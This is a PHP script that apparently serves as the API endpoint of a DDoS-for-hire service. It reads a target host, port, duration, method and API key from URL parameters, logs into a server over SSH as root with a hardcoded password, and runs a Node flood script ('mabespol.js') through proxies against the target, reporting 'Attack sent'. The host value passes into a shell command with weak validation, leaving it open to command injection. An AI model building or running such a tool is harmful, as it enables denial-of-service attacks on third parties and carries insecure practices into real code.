 <?php
		include('Net/SSH2.php');

		$address = "localhost"; //Server IP (If same server use localhost)

		$serverPort = 22; //SSH port (Default 22)
		
		$user = "root"; //User for the server
		
		$password = "rootB3er"; //Password for the server
		
		$Methods = array("mabespol"); //Array of methods

		$APIKey = array("ptacid1131","ptacid1131"); //Your API Key

		$host = $_GET["host"];
		$port = intval($_GET['port']);
		$time = intval($_GET['time']);
		$method = $_GET["method"];

		$key = $_GET["key"];

		if (empty($host) | empty($port) | empty($time) | empty($method)) //Checking the fields
		{
			die("Please verify all fields");
		}

		if (!is_numeric($port) || !is_numeric($time)) 
		{
			die('Time and Port must be a number');
		}
	  
		if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL)) //Validating target
		{
			die('Please insert a correct IP address(v4)/URL..');
		}

		if($port < 1 && $port > 65535) //Validating port
		{
			die("Port is invalid");
		}

		if ($time < 1) //Validating time
		{
			die("Time is invalid");
		}

		if (!in_array($method, $Methods)) //Validating method
		{
			die("Method is invalid");
		}
		
		if (!in_array($key, $APIKey)) //Validating API Key
		{ 
			die("Invalid API Key");
		}

		$connection = ssh2_connect($address, $serverPort);
		if(ssh2_auth_password($connection, $user, $password))
		{
	    if($method == "mabespol"){if(ssh2_exec($connection, "screen -dm node /root/mabespol.js $host $time 32 15 proxy.txt")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}		    
		}
		else
		{
			die("Could not login to remote server, this may be a error with the login cedentials.");
		}
	?>